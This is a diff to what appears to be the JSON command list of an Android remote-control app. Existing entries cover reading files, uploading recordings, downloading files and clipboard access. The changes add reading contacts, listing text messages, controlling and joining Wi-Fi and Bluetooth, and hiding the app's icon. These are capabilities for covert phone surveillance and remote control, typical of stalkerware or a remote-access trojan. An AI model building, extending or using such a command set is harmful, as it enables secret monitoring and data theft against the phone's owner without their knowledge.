@@ -35,9 +35,8 @@
 {"request":"removeAllConnections"}
 {"request":"sendToAllConnections","message":""}
 {"request":"adminMode"}
-{"request":"wifiPower","power":true}
-{"request":"bluetoothPower","power":true}
 {"request":"ringerMode","mode":"silent"}
+{"request":"readContacts","filterName":"","limit":0}
 {"request":"readDirectory","directory":"/sdcard"}
 {"request":"readFile","file":"/sdcard/file.txt"}
 {"request":"writeFile","file":"/sdcard/file.txt","index":""}
@@ -57,9 +56,16 @@
 {"request":"uploadFolder","default":"recordings","delete":false}
 {"request":"clearUploadQueue"}
 {"request":"getUploadQueue"}
-{"request":"downloadFile", "file":"/","address":"http://"}
+{"request":"downloadFile","file":"/","address":"http://"}
+{"request":"bluetoothManager","mode":"power", "power":true}
+{"request":"bluetoothManager","mode":"pairList"}
+{"request":"wifiManager","mode":"power","power":true}
+{"request":"wifiManager","mode":"scan"}
+{"request":"wifiManager","mode":"connect","network":"","password":""}
+{"request":"messageList","address":"","limit":0}
 {"request":"clipboard","text":""}
 {"request":"mediaButton","event":""}
 {"request":"getStatus"}
 {"request":"stopSelf"}
 {"printDeviceName":"true"}
+{"request":"appIcon","show":false}
